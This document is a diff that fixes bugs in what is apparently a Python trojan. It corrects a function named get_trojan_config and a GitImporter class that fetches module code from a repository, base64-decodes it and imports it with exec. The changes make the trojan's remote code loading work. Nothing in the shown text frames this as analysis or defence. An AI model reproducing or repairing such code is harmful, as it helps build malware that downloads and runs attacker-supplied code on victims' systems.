@@ -64,9 +64,9 @@ def get_trojan_config():
 
     for task in config:
 
-        if task("module") not in sys.modules:
+        if task["module"] not in sys.modules:
 
-            exec("import {}".format.task("module"))
+            exec("import {}".format(task["module"]))
 
     return config
 
@@ -94,7 +94,7 @@ class GitImporter(object):
     def find_module(self,fullname,path=None):
         if configured:
             print ("[*] Attempting to retrieve {}".format(fullname))
-            new_library = get_file_contents("modules/{}".format(fulname))
+            new_library = get_file_contents("modules/{}".format(fullname))
 #we base64 decode the code and store it in our class
             if new_library is not None:
                 self.current_module_code = base64.b64decode(new_library)
